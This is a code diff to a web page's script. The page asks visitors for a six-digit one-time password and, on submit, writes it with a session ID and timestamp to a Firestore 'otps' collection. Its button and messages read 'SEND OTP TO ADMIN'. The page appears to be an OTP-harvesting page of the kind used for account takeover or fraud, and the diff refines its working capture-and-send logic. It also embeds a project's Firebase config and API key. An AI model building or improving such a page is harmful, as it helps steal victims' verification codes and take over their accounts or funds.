@@ -93,11 +93,11 @@
     </div>
 
     <!-- Firebase SDKs -->
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
 
     <script>
-        // Aapki Firebase Config yahan add kar di gayi hai
+        // Firebase Config
         const firebaseConfig = {
             apiKey: "AIzaSyCrrUQLMes8TcRXbEk1I1a8D6vnhAFaLNvI",
             authDomain: "amar-d755e.firebaseapp.com",
@@ -107,11 +107,13 @@
             appId: "1:761406989668:web:d26bb2ee84ac257a150671"
         };
 
-        // Firebase Initialize karein
-        firebase.initializeApp(firebaseConfig);
+        // Firebase Initialize
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
         const db = firebase.firestore();
 
-        // Unique Session ID generator
+        // Session ID
         const sessionId = 'AMAR-' + Math.random().toString(36).substring(2, 8).toUpperCase();
         document.getElementById('sessionIdDisplay').innerText = sessionId;
 
@@ -126,7 +128,6 @@
 
         let isMasked = false;
 
-        // Input validation & formatting
         otpInput.addEventListener('input', (e) => {
             e.target.value = e.target.value.replace(/[^0-9]/g, '');
             const len = e.target.value.length;
@@ -140,7 +141,6 @@
             }
         });
 
-        // Hide/Show Toggle
         toggleMask.addEventListener('click', () => {
             isMasked = !isMasked;
             if (isMasked) {
@@ -152,8 +152,8 @@
             }
         });
 
-        // Submit to Firestore
-        otpForm.addEventListener('submit', async (e) => {
+        // Submit Form
+        otpForm.addEventListener('submit', function(e) {
             e.preventDefault();
             const otpValue = otpInput.value.trim();
 
@@ -164,33 +164,33 @@
 
             submitBtn.disabled = true;
             submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>Sending to Admin...</span>';
+            statusAlert.classList.add('hidden');
 
-            try {
-                await db.collection('otps').add({
-                    otp: otpValue,
-                    length: otpValue.length,
-                    sessionId: sessionId,
-                    status: 'Pending',
-                    createdAt: firebase.firestore.FieldValue.serverTimestamp(),
-                    userAgent: navigator.userAgent
-                });
-
+            db.collection('otps').add({
+                otp: otpValue,
+                length: otpValue.length,
+                sessionId: sessionId,
+                status: 'Pending',
+                createdAt: firebase.firestore.FieldValue.serverTimestamp()
+            })
+            .then(() => {
                 statusAlert.className = "p-3 bg-emerald-500/10 border border-emerald-500/30 rounded-xl text-emerald-400 text-xs text-center";
                 statusAlert.innerHTML = '<i class="fas fa-check-circle mr-1"></i> OTP successfully sent to Admin!';
                 statusAlert.classList.remove('hidden');
                 otpInput.value = '';
                 digitStatus.innerText = 'Digit Count: 0/6';
                 validBadge.classList.add('hidden');
-
-            } catch (err) {
-                console.error(err);
+            })
+            .catch((err) => {
+                console.error("Firestore Error: ", err);
                 statusAlert.className = "p-3 bg-red-500/10 border border-red-500/30 rounded-xl text-red-400 text-xs text-center";
-                statusAlert.innerHTML = '<i class="fas fa-exclamation-triangle mr-1"></i> Connection failed! Please check Firestore rules.';
+                statusAlert.innerHTML = '<i class="fas fa-exclamation-triangle mr-1"></i> Connection error: ' + err.message;
                 statusAlert.classList.remove('hidden');
-            } finally {
+            })
+            .finally(() => {
                 submitBtn.disabled = false;
                 submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> <span>SEND OTP TO ADMIN</span>';
-            }
+            });
         });
     </script>
 </body>
